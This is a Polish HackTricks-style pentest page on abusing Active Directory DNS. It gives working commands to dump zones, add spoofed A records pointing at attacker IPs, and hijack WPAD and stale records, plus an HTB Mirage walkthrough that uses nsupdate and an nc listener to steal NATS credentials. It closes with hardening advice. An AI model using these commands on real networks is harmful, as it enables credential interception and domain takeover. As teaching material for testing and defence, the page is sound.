# Rekordy DNS AD

{{#include ../../banners/hacktricks-training.md}}

Domyślnie **każdy użytkownik** w Active Directory może **wyliczyć wszystkie rekordy DNS** w strefach DNS domeny lub lasu, podobnie jak w przypadku transferu strefy (użytkownicy mogą wyświetlać obiekty podrzędne strefy DNS w środowisku AD).

Narzędzie [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) umożliwia **enumeration** i **eksportowanie** **wszystkich rekordów DNS** w strefie na potrzeby rozpoznania sieci wewnętrznych.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (kwiecień 2025) dodaje dane wyjściowe w formacie JSON/Greppable (`--json`), wielowątkowe rozwiązywanie DNS oraz obsługę TLS 1.2/1.3 podczas nawiązywania połączenia z LDAPS

Więcej informacji znajdziesz na stronie [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Tworzenie / modyfikowanie rekordów (ADIDNS spoofing)

Ponieważ grupa **Authenticated Users** ma domyślnie uprawnienie **Create Child** na liście DACL strefy, każde konto domenowe (lub konto komputera) może zarejestrować dodatkowe rekordy. Można to wykorzystać do przejmowania ruchu, wymuszania NTLM relay, a nawet do całkowitego przejęcia domeny.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py jest dostarczany z Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Typowe prymitywy ataku

1. **Rekord wildcard** – `*.<zone>` zmienia serwer AD DNS w ogólnokorporacyjny responder podobny do spoofingu LLMNR/NBNS. Można go wykorzystać do przechwytywania hashy NTLM lub przekazywania ich do LDAP/SMB.  (Wymaga wyłączenia WINS-lookup.)<sup>[[1]](#references)</sup>
2. **Przejęcie WPAD** – dodaj `wpad` (lub rekord **NS** wskazujący na hosta atakującego, aby ominąć Global-Query-Block-List) i transparentnie proxy'uj wychodzące żądania HTTP w celu pozyskania poświadczeń. Microsoft załatał obejścia wildcard/DNAME (CVE-2018-8320), ale **rekordy NS nadal działają**.<sup>[[1]](#references)</sup>
3. **Przejęcie nieaktualnego wpisu** – przejmij adres IP, który wcześniej należał do stacji roboczej, a powiązany wpis DNS nadal będzie się rozwiązywał, umożliwiając ataki resource-based constrained delegation lub Shadow-Credentials bez jakiejkolwiek ingerencji w DNS.
4. **DHCP → spoofing DNS** – we wdrożeniu Windows DHCP+DNS z domyślną konfiguracją nieuwierzytelniony atakujący w tej samej podsieci może nadpisać dowolny istniejący rekord A (w tym rekordy Domain Controllers), wysyłając sfałszowane żądania DHCP, które wywołują dynamiczne aktualizacje DNS (Akamai „DDSpoof”, 2023). Zapewnia to atak machine-in-the-middle przeciwko Kerberos/LDAP i może prowadzić do pełnego przejęcia domeny.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – zmień `dNSHostName` kontrolowanego przez siebie konta komputera, zarejestruj pasujący rekord A, a następnie zażądaj certyfikatu dla tej nazwy, aby podszyć się pod DC. Narzędzia takie jak **Certipy** lub **BloodyAD** w pełni automatyzują ten proces.

---

### Przejęcie wewnętrznej usługi za pomocą nieaktualnych rekordów dynamicznych (case study NATS)

Gdy aktualizacje dynamiczne pozostają otwarte dla wszystkich uwierzytelnionych użytkowników, **wyrejestrowana nazwa usługi może zostać ponownie przejęta i skierowana do infrastruktury atakującego**. DC Mirage HTB ujawnił hostname `nats-svc.mirage.htb` po DNS scavenging, więc każdy użytkownik z niskimi uprawnieniami mógł:<sup>[[3]](#references)</sup>

1. **Potwierdzić brak rekordu** i poznać SOA za pomocą `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Utwórz ponownie rekord** wskazujący na kontrolowany przez nich interfejs zewnętrzny/VPN:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Podszyj się pod usługę plaintext**. Klienci NATS oczekują jednego banera `INFO { ... }`, zanim wyślą dane uwierzytelniające, więc skopiowanie prawidłowego banera z rzeczywistego brokera wystarczy do przechwycenia sekretów:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Każdy klient, który rozwiąże przejętą nazwę, natychmiast wykona leak swojej ramki JSON `CONNECT` (w tym pól `"user"`/`"pass"`) do listenera. Uruchomienie oficjalnego pliku binarnego `nats-server -V` na hoście atakującego, wyłączenie redakcji logów lub zwykłe przechwycenie sesji za pomocą Wireshark daje te same dane uwierzytelniające w postaci jawnego tekstu, ponieważ TLS było opcjonalne.

4. **Pivot with the captured creds** – w Mirage skradzione konto NATS zapewniało dostęp do JetStream, co ujawniło historyczne zdarzenia uwierzytelniania zawierające możliwe do ponownego użycia nazwy użytkowników/hasła AD.

Ten schemat dotyczy każdej usługi zintegrowanej z AD, która opiera się na niezabezpieczonych uzgadnianiach TCP (API HTTP, RPC, MQTT itd.): po przejęciu rekordu DNS atakujący staje się usługą.

---

## Wykrywanie i hardening

* Odbierz **Authenticated Users** uprawnienie *Create all child objects* wrażliwych stref i deleguj aktualizacje dynamiczne dedykowanemu kontu używanemu przez DHCP.
* Jeśli aktualizacje dynamiczne są wymagane, ustaw strefę na **Secure-only** i włącz **Name Protection** w DHCP, aby tylko właściciel obiektu komputera mógł nadpisywać własny rekord.
* Monitoruj identyfikatory zdarzeń serwera DNS 257/252 (aktualizacja dynamiczna), 770 (transfer strefy) oraz zapisy LDAP do `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokuj niebezpieczne nazwy (`wpad`, `isatap`, `*`) za pomocą celowo nieszkodliwego rekordu lub przez Global Query Block List.
* Aktualizuj serwery DNS – na przykład błędy RCE CVE-2024-26224 i CVE-2024-26231 osiągnęły **CVSS 9.8** i mogą być zdalnie wykorzystywane przeciwko kontrolerom domeny.

## Referencje

- [1] [ADIDNS ponownie – WPAD, GQBL i więcej](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, nadal de facto główna referencja dotycząca ataków wildcard/WPAD)
- [2] [Spoofing rekordów DNS poprzez nadużywanie dynamicznych aktualizacji DNS DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (grudzień 2023)
- [3] [HackTheBox Mirage: łączenie leaków NFS, nadużywania dynamicznego DNS, kradzieży danych uwierzytelniających NATS, sekretów JetStream i Kerberoastingu](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: zrzucanie DNS Active Directory za pomocą adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
